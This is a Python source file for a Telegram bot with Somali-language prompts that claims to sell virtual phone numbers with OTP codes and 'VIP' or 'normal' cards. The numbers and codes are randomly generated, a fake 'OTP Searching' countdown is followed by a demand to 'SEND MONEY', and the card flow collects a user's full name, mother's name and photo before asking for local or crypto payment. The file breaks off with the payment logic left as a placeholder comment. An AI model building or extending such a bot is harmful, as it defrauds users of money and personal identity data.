import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

# ================= STORAGE =================
users = {}
pending_admin = {}

# ================= STATES =================
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class CodeState(StatesGroup):
    code = State()

# ================= HELPERS =================
def normal_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4,9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def countdown(msg, text, sec=5):
    for i in range(sec,0,-1):
        await msg.edit_text(f"{text}\n⏳ {i} sec")
        await asyncio.sleep(1)
    await msg.edit_text("Processing...")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("New Order"), KeyboardButton("Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖\nDooro New Order ama Check Code:", reply_markup=kb)

# ================= NEW ORDER =================
@dp.message(F.text=="New Order")
async def new_order(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton("CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL =================
@dp.callback_query(F.data=="virtual")
async def virtual(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton("TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton("Google", callback_data="v_Google")],
        [InlineKeyboardButton("Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_process(call: CallbackQuery):
    platform = call.data.split("_")[1]
    number = normal_number()
    code = generate_code()

    users[call.from_user.id] = {
        "type":"virtual",
        "platform": platform,
        "number": number,
        "code": code
    }

    msg = await call.message.edit_text("OTP Searching...")
    await countdown(msg,"OTP Searching",5)

    # Admin approval
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"approve_{call.from_user.id}")],
        [InlineKeyboardButton("REJECT", callback_data=f"reject_{call.from_user.id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"Virtual Request\nUser: {call.from_user.id}\nPlatform: {platform}\nNumber: {number}",
        reply_markup=kb
    )

    # 10 sec wait
    await asyncio.sleep(10)
    if pending_admin.get(call.from_user.id, True):
        await call.message.answer("PLEASE SEND MONEY 💵")

# ================= CARD =================
@dp.callback_query(F.data=="card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIP - $15", callback_data="vip")],
        [InlineKeyboardButton("NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

# Card basic info
@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    number = vip_number() if call.data=="vip" else normal_number()
    users[call.from_user.id] = {"type":"card","level":call.data,"number":number}
    await call.message.answer("Geli Magaca Saddexan:")
    await state.set_state(CardState.full_name)

@dp.message(CardState.full_name)
async def name(msg: types.Message,state:FSMContext):
    users[msg.from_user.id]["name"]=msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def mother(msg: types.Message,state:FSMContext):
    users[msg.from_user.id]["mother"]=msg.text
    await msg.answer("Soo dir Sawirkaaga:")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def photo(msg: types.Message,state:FSMContext):
    users[msg.from_user.id]["photo"]=msg.photo[-1].file_id
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="pay_local")],
        [InlineKeyboardButton("CRYPTO", callback_data="pay_crypto")]
    ])
    await msg.answer("Dooro Payment Method:",reply_markup=kb)

# ================= PAYMENT / ADMIN =================
# … Continue payment, screenshot, admin approval, check code exactly sida Part3
# ================= END =================

# ================= RUN BOT =================
if __name__=="__main__":
    import asyncio
    asyncio.get_event_loop().run_until_complete(dp.start_polling(bot))
